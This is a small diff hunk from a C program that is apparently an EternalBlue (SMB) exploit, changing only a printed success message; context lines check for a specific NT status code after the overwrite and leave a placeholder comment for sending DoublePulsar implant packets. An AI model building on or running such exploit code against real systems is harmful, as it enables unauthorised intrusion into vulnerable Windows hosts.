@@ -198,7 +198,7 @@ int main(int argc, char** argv)
     //compare the NT_STATUS response to 0xC000000D ( STATUS_INVALID_PARAMETER)
     if (recvbuff[9] == 0x0D && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
     {
-        printf("EternalBlue overwrite was successful\n");
+        printf("Got good response status!  EternalBlue overwrite was successful!\n");
     }
     
     // SEND MORE DOUBLPULSAR PACKETS HERE
